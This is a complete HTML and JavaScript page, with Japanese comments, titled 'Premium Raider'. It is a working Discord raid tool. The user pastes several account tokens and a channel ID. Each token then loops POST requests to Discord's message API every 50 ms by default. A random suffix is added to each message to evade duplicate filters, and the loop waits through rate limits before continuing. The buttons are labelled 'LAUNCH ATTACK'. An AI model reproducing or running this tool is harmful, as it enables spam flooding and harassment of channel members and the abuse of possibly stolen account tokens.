<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Raider Terminal</title>
    <style>
        :root {
            /* グラデーションパレット */
            --main-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --danger-gradient: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
            --bg-dark: #0f0c29; /* 深みのある紺色 */
            --card-bg: rgba(30, 30, 50, 0.95);
            --input-bg: rgba(0, 0, 0, 0.3);
            --text-color: #ffffff;
            --radius: 20px;
        }

        /* 背景にグラデーションを適用し、スクロールを可能にする */
        body {
            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
            color: var(--text-color);
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 40px 20px; /* 上下に余白 */
            display: flex;
            justify-content: center;
            min-height: 100vh;
            overflow-y: auto; /* 下へのスクロールを許可 */
            box-sizing: border-box;
        }

        /* メインカード：少し透明にして高級感を出す */
        .card {
            background: var(--card-bg);
            width: 100%;
            max-width: 500px;
            padding: 40px;
            border-radius: var(--radius);
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            backdrop-filter: blur(10px); /* 背景をぼかす */
            border: 1px solid rgba(255,255,255,0.1);
            height: fit-content; /* 中身の高さに合わせる */
        }

        h1 {
            font-size: 26px;
            text-align: center;
            margin-bottom: 30px;
            background: var(--main-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
        }

        .form-group { margin-bottom: 25px; }

        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #aaa;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        textarea, input {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: white;
            padding: 15px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }

        textarea:focus, input:focus {
            border-color: #667eea;
            box-shadow: 0 0 15px rgba(102, 126, 234, 0.3);
        }

        /* ボタン：グラデーションとアニメーション */
        .controls { display: flex; gap: 15px; margin-top: 30px; }

        button {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .btn-start {
            background: var(--main-gradient);
        }

        .btn-stop {
            background: var(--danger-gradient);
        }

        /* クリックした時の「押し込んだ感じ」 */
        button:hover {
            transform: translateY(-3px);
            filter: brightness(1.1);
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
        }

        button:active {
            transform: translateY(1px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        /* ログエリア：中身が増えてもスクロール可能 */
        #console {
            margin-top: 30px;
            height: 150px;
            background: rgba(0,0,0,0.4);
            border-radius: 15px;
            padding: 15px;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            overflow-y: auto;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .log-entry { margin-bottom: 5px; border-left: 3px solid #667eea; padding-left: 8px; }
        .log-error { border-left-color: #ff5f6d; color: #ff5f6d; }
    </style>
</head>
<body>

<div class="card">
    <h1>PREMIUM RAIDER</h1>

    <div class="form-group">
        <label>DISCORD TOKENS</label>
        <textarea id="tokens" rows="4" placeholder="トークンを貼り付け..."></textarea>
    </div>

    <div class="form-group">
        <label>CHANNEL ID</label>
        <input type="text" id="channelId" placeholder="IDを入力">
    </div>

    <div class="form-group">
        <label>MESSAGE (Use \n for lines)</label>
        <textarea id="message" rows="2" placeholder="メッセージを入力"></textarea>
    </div>

    <div class="form-group">
        <label>DELAY (ms)</label>
        <input type="number" id="delay" value="0">
    </div>

    <div class="controls">
        <button id="start" class="btn-start">LAUNCH ATTACK</button>
        <button id="stop" class="btn-stop">STOP</button>
    </div>

    <div id="console">
        <div class="log-entry">System ready...</div>
    </div>
</div>

<script>
    let isRunning = false;
    const consoleDiv = document.getElementById('console');

    function log(msg, isError = false) {
        const div = document.createElement('div');
        div.className = `log-entry ${isError ? 'log-error' : ''}`;
        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
        consoleDiv.prepend(div);
    }

    const randomStr = () => Math.random().toString(36).substring(2, 8);

    async function fire(token, channelId, message, delay) {
        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
        while (isRunning) {
            const content = `${message} | ${randomStr()}`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Authorization': token.trim(),
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content, tts: false })
                });

                if (res.ok) {
                    log(`SUCCESS: ${token.substring(0, 8)}...`);
                } else if (res.status === 429) {
                    const data = await res.json();
                    log(`RATELIMIT: ${data.retry_after}s`, true);
                    await new Promise(r => setTimeout(r, data.retry_after * 1000));
                } else {
                    log(`FAILED: ${res.status}`, true);
                }
            } catch (e) {
                log("CORS/Network Error", true);
            }
            if (delay > 0) await new Promise(r => setTimeout(r, delay));
            else await new Promise(r => setTimeout(r, 50)); 
        }
    }

    document.getElementById('start').onclick = () => {
        if (isRunning) return;
        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim() !== '');
        const channelId = document.getElementById('channelId').value.trim();
        const message = document.getElementById('message').value.replace(/\\n/g, '\n');
        const delay = parseInt(document.getElementById('delay').value);

        if (!tokens.length || !channelId) return alert("入力が足りません");

        isRunning = true;
        log("Attack initiated.");
        tokens.forEach(t => fire(t, channelId, message, delay));
    };

    document.getElementById('stop').onclick = () => {
        isRunning = false;
        log("Attack stopped.", true);
    };
</script>

</body>
</html>
